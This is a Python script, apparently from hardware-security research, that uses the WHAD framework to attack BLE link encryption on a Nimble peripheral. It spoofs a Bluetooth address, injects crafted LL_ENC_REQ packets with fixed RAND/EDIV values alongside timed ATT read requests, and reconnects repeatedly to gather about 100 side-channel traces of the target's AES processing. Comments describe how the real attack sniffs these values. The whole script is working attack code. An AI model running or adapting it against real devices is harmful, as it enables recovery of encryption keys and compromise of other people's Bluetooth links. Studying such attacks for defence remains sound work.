from whad.ble import Central, ConnectionEventTrigger, ReceptionTrigger
from whad.ble.profile import UUID
from whad.ble.stack.llm import START_ENC_REQ, REJECT_IND
from whad.device import WhadDevice
from time import sleep, time
from scapy.all import BTLE_DATA, BTLE_ADV, ATT_Hdr, L2CAP_Hdr, ATT_Read_Request, BTLE_EMPTY_PDU, BTLE_CTRL, LL_ENC_REQ, LL_START_ENC_REQ

TIME_START                = 0
TIME_END                  = 0
HCI_CREATE_CONNECTION_CNT = 0
LL_START_ENC_REQ_CNT      = 0

# Create central device.
TIME_START = time()
print("Create central from uart0")
central = Central(WhadDevice.create('uart0'))
# This has to be set to the Bluetooth adress of the HCI device used to
# establish the pairing, since the tuple used for LTK identification is
# (BD_ADDR, EDIV, RAND).
central.set_bd_address("B8:8A:60:F9:FD:5C")
# Show received packets that are not advertising or empty. */
# central.attach_callback(lambda pkt:pkt.show(), on_transmission=False, on_reception=True, filter=lambda pkt:pkt.haslayer(BTLE_ADV) == 0 and pkt.getlayer(BTLE_DATA).len)
# Show received packets that are START_ENC_REQ. */
# central.attach_callback(lambda pkt:pkt.show(), on_transmission=False, on_reception=True, filter=lambda pkt:BTLE_CTRL in pkt and pkt.opcode == START_ENC_REQ)
# Raise an error if a REJECT_IND is received, meaning that EDIV/RAND/BD_ADDR
# aren't correct and that legitimate connection sniffing needs to be redone.
central.attach_callback(lambda pkt:print("[ERROR] LL_REJECT_IND received!"), on_transmission=False, on_reception=True, filter=lambda pkt:BTLE_CTRL in pkt and pkt.opcode == REJECT_IND)

# Require a defined number of encryption response that simulate multiple traces collection.
while LL_START_ENC_REQ_CNT < 100:
    # At connection event #5, send an empty packet. The goal here is just to
    # inform the radio thread that it has to turn ON the recording at a precise
    # connection event.
    radio_state = False
    radio_trigger = ConnectionEventTrigger(5)
    central.prepare(
        BTLE_DATA() / BTLE_EMPTY_PDU(),
        trigger=radio_trigger
    )

    # At connection event #15, send the ATT_Read_Requests and the
    # LL_ENC_REQ. The connection event's number has be adjusted to let the time
    # to the radio to start recording. The different parameters are:
    # 1. (RAND, EDIV) are obtained after pairing. They are currently fixed in
    # the Nimble firmware. In the real attack scenario, they are sniffed.
    # 2. (SKDM, IVM) are randomly generated in a real attack scenario. We can
    # keep fixed arbitrary values.
    # 3. (MD=1) force the ATT_Read_Response to be on the same connection event
    # as the ENC_RSP, excepting to have the ATT_Read_Response during AES
    # processing. Do not set the MD bit before, otherwise connection event will
    # be separated.
    ll_enc_req_state = False
    ll_enc_req_trigger = ConnectionEventTrigger(15)
    central.prepare(
        BTLE_DATA()     / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_Request(gatt_handle=3),
        BTLE_DATA(MD=1) / BTLE_CTRL() / LL_ENC_REQ(rand=0x57d757a950579105, ediv=0x7e92, skdm=0xf3681496c43831bb, ivm=0x99e664e3),
        trigger=ll_enc_req_trigger
    )
    
    # When receiveing a LL_START_ENC_REQ packet, send an empty packet. The goal
    # here is just to count the number of successful link encryption to know
    # how many trace we capture.
    ll_start_enc_req_state = False
    ll_start_enc_req_trigger = ReceptionTrigger(
        packet=BTLE_DATA() / BTLE_CTRL() / LL_START_ENC_REQ(),
        selected_fields=("opcode")
    )
    central.prepare(
        BTLE_DATA() / BTLE_EMPTY_PDU(),
        trigger=ll_start_enc_req_trigger
    )

    # Connect to the peripheral. The parameters are:
    # 1. Use increased hop interval. TODO Decreasing it speed-up the connection
    # and doesn't seems to make ATT_Read_Response and LL_ENC_REQ on different channel
    # (hence, different connection event). Would it be better to do so?
    # 2. Set channel map to 0x300 which corresponds to channel 8-9.
    device = central.connect('F4:9E:F2:6D:37:85', random=False, hop_interval=56, channel_map=0x00000300)
    HCI_CREATE_CONNECTION_CNT += 1
    # Connection can be lost because of firmware bugs, interferances, or because
    # our packets are not legitimate. If so, just retry a connect.
    while central.is_connected():
        # Step 1: Turn the radio ON.
        if radio_trigger.triggered and not radio_state:
            print("[RADIO ON]")
            radio_state = True
        # Step 2: Send ATT_Read_Request and LL_ENC_REQ to the Peripheral.
        if radio_state and ll_enc_req_trigger.triggered and not ll_enc_req_state:
            print("[LL_ENC_REQ SEND]")
            ll_enc_req_state = True
        # Step 3: Wait for the LL_START_ENC_REQ from the Peripheral.
        if ll_enc_req_state and ll_start_enc_req_trigger.triggered and not ll_start_enc_req_state:
            print("[LL_START_ENC_REQ RECEIVED]")
            ll_start_enc_req_state = True
            LL_START_ENC_REQ_CNT += 1
        # Step 4: Disconnect.
        if ll_start_enc_req_state:
            print("[RADIO OFF]")
            device.disconnect()
            sleep(0.2) # Insert a small delay between two subsequent connections.
            break # Break out of the loop, otherwise we send two disconnect.

# Clean.
central.stop()
central.close()
TIME_END = time()

# Display informations.
print("HCI_CREATE_CONNECTION_CNT={}".format(HCI_CREATE_CONNECTION_CNT))
print("LL_START_ENC_REQ_CNT={}".format(LL_START_ENC_REQ_CNT))
print("TIME={:.2f}s".format(TIME_END - TIME_START))
